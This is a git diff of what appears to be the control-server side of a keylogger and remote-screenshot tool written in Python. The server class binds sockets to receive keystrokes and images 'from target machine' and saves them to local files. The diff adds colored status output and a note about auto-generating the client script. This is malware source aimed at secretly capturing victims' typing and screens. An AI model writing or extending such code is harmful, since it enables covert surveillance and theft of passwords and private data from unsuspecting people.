@@ -56,7 +56,7 @@ class Server:
           :path: Path of file where keystrokes should be  stored. The file path may be relative or absolute and the file may or may not exist. Moreover, it defaults "logs.txt" in currerent directory
           :return: None
         """
-        
+        print(f"[*]Keystrokes file path -> {colored(path,'green')}")
         with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as ksock:
              ksock.bind((self.ip,self.port))
              print(f"[*]Listening on {self.ip}:{self.port}")
@@ -77,6 +77,7 @@ class Server:
            :path: Path of file where the image(from target machine) should be  stored. The file path may be relative or absolute and the file may or may not exist. Moreover, it defaults "image.jpeg" in currerent directory
            :return: None
         """
+        print(f"[*]Image file path -> {colored(path,'green')}")
         while True:
           with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s_sock:
                 s_sock.bind((self.ip,self.port))
@@ -93,6 +94,7 @@ class Server:
            
 
 def main()->None:
+   #work in auto generation of script
     while True:
         HOST = input("Host : ") or "192.168.100.115"
         try:
@@ -111,9 +113,9 @@ def main()->None:
     KPATH = input("Path of file to save keystrokes: ") or "logs.txt"
     IPATH = input("Path of file to save image: ") or "image.jpeg"
     print(f"[*]Host -> {HOST}")
-    print(f"[*]Main port -> {MAIN_PORT}")
-    print(f"[*]Keylogger server port(K_PORT or KPORT or KEY PORT) -> {KLOG_PORT}")
-    print(f"[*]Image server port -> {BIN_PORT}")
+    print("[*]Main port -> {}".format(colored(MAIN_PORT,"green")))
+    print("[*]Keylogger server port(K_PORT or KPORT or KEY PORT) -> {}".format(colored(KLOG_PORT,"green")))
+    print("[*]Image server port -> {}".format(colored(BIN_PORT,"green")))
     
     active_server = Server(HOST,MAIN_PORT)
     keylog_server = Server(HOST,KLOG_PORT)
